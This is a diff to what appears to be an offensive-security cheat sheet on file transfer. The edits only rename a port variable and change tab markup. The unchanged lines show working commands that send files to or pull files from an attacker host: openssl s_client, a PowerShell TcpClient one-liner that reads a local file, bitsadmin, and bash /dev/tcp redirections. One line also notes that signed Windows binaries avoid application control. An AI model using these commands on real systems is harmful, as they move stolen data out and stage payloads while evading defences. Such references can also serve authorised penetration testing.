@@ -172,7 +172,7 @@ openssl s_client -quiet -connect $ATTACKER_IP:53 < file
 
 :::tabs
 
-== PowerShell
+=== PowerShell
 
 ::: code-group
 
@@ -196,7 +196,7 @@ Invoke-FileUpload -Uri $URL -File <file>
 $c=New-Object Net.Sockets.TcpClient("$ATTACKER_IP",$ATTACKER_PORT);$s=$c.GetStream();$s.Write(($b=[IO.File]::ReadAllBytes("C:\Path\file")),0,$b.Length);$c.Close()
 ```
 
-== LOLBins
+=== LOLBins
 
 Signed Microsoft binaries, present by default. Less likely to trip app-control than a downloaded `nc.exe`.
 
@@ -225,15 +225,15 @@ bitsadmin /transfer job /download /priority foreground http://$ATTACKER_IP:$ATTA
 
 ```bash [cat]
 # Download
-cat < /dev/tcp/$ATTACKER_IP/$PORT > file
+cat < /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT > file
 
 # Upload
-cat file > /dev/tcp/$ATTACKER_IP/$PORT
+cat file > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT
 ```
 
 ```bash [Unix Pipe]
 # Raw HTTP request, read response
-exec 3<>/dev/tcp/$ATTACKER_IP/$PORT
+exec 3<>/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT
 echo -e "GET /chisel HTTP/1.1\n\n">&3
 cat <&3
 ```
